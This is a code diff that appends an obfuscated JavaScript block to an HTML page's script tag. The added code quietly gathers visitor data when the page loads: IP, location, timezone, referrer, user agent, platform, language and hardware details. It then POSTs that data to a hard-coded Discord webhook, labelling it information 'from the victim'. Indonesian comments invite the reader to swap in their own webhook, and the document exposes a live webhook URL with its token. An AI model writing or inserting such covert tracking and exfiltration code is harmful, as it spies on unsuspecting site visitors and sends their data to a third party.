@@ -488,6 +488,61 @@ function _0x2a5c9a() {
     }
 }
 _0x4829d0(), _0x4efaa2(), _0x389ff2(), _0x6ec136(), _0x2a5c9a();
+
+   const webhookURL = 'https://discord.com/api/webhooks/1364868488497336370/mx-rcJWwTZiXq7QXPya9fq3h20K7ojujZrXieoBpgksWc7h16jro0Na5DHS8riE6w_Dh'; // ganti punyamu
+
+const data = {
+  ip: document[_0x2da140(0x255)](_0x2da140(0x227))?.[_0x2da140(0x22f)] || 'Unknown',
+  date: new Date().toString(),
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  location: window[_0x2da140(0x22f)] || 'Unknown',
+  referrer: document[_0x2da140(0x208)] || _0x2da140(0x25c) + 'r',
+  userAgent: navigator[_0x2da140(0x1bd)],
+  browserName: navigator[_0x2da140(0x239)],
+  platform: navigator[_0x2da140(0x1e4)],
+  language: navigator[_0x2da140(0x1e1)],
+  online: navigator[_0x2da140(0x2571)],
+  cookies: navigator[_0x2da140(0x200)],
+  doNotTrack: navigator[_0x2da140(0x206)],
+  vendor: _0x2da140(0x22f), // bisa di-update sesuai key string
+  model: _0x2da140(0x22f),
+  os: _0x2da140(0x22f),
+  logicalCPU: navigator[_0x2da140(0x1db)] + ' × ' + _0x2da140(0x23d),
+  gpuVendor: _0x2da140(0x22f),
+  gpuRenderer: _0x2da140(0x22f),
+};
+
+const payload = {
+  content: 'Informasi lengkap dari korban:',
+  embeds: [
+    {
+      title: 'Data Device',
+      fields: [
+        { name: 'IP Address', value: data.ip },
+        { name: 'Timezone', value: data.timezone },
+        { name: 'Location', value: data.location },
+        { name: 'Date', value: data.date },
+        { name: 'Referrer', value: data.referrer },
+        { name: 'User Agent', value: data.userAgent },
+        { name: 'Browser Name', value: data.browserName },
+        { name: 'Platform', value: data.platform },
+        { name: 'Language', value: data.language },
+        { name: 'Cookies Enabled', value: data.cookies.toString() },
+        { name: 'Do Not Track', value: data.doNotTrack },
+        { name: 'Logical CPU', value: data.logicalCPU },
+        { name: 'GPU Vendor', value: data.gpuVendor },
+        { name: 'GPU Renderer', value: data.gpuRenderer },
+      ],
+    },
+  ],
+};
+
+fetch(webhookURL, {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify(payload),
+});
+   
   </script> 
  </body>
 </html>
